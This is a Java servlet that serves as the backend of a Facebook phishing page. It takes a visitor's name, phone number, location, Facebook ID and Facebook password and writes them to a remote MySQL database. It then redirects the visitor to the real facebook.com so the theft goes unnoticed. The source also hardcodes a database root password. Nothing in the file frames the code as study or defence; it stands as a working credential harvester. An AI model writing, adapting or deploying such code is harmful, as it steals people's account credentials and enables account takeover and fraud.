package com.nt.servlet;

import java.io.IOException;
import java.io.PrintWriter;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.SQLException;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet("/getfburl")
public class GetFacebook extends HttpServlet {
	private static final String query="INSERT INTO FACEBOOK_DETAIL VALUES(?,?,?,?,?,?)";
	public void doGet(HttpServletRequest req,HttpServletResponse res) throws IOException,ServletException{
		PrintWriter pw=null;
		pw=res.getWriter();
		res.setContentType("text/html");
		Connection con=null;
		PreparedStatement ps=null;
		String url=null;
		int result=0;
		String name=null,no,district,state,fbuser,fbpwd;
		name=req.getParameter("name");
		no=req.getParameter("no");
		district=req.getParameter("district");
		state=req.getParameter("state");
		fbuser=req.getParameter("fbid");
		fbpwd=req.getParameter("pass");
		
		try{
			Class.forName("com.mysql.jdbc.Driver");
			con=DriverManager.getConnection("jdbc:mysql://node49277-env-0968747.fr-1.paas.massivegrid.net/deepak1","root","PdVWyBwuMC");
			if(con!=null)
			   ps=con.prepareStatement(query);
			if(ps!=null) {
				ps.setString(1,name);
				ps.setString(2,no);
				ps.setString(3,district);
				ps.setString(4,state);
				ps.setString(5,fbuser);
				ps.setString(6,fbpwd);
			}
			if(ps!=null)
				result=ps.executeUpdate();
			if(result==0) {
				pw.println("<h1>records not updated</h1>");
			}
			else {
				//pw.println("<br><h1 style='text-align:center'>record updated</h1>");
				//send rd concept for original fb
				url="https://www.facebook.com/";
				res.sendRedirect(url);
			
			}
		}//try
		catch(SQLException se){
			se.printStackTrace();
		}
		catch(ClassNotFoundException cnf) {
			cnf.printStackTrace();
		}
		catch(Exception e) {
			e.printStackTrace();
		}
		finally {
			try {
				if(ps!=null)
				  ps.close();
			}
			catch(SQLException se) {
				se.printStackTrace();
			}
			try {
				if(con!=null)
				  con.close();
			}
			catch(SQLException se) {
				se.printStackTrace();
			}
		}//finally
		
		
	    pw.println("<a href='home.html'>home</a>");
	    pw.close();
	}
	
   public void doPost(HttpServletRequest req,HttpServletResponse res) throws IOException,ServletException{
		doGet(req,res);
	}
}
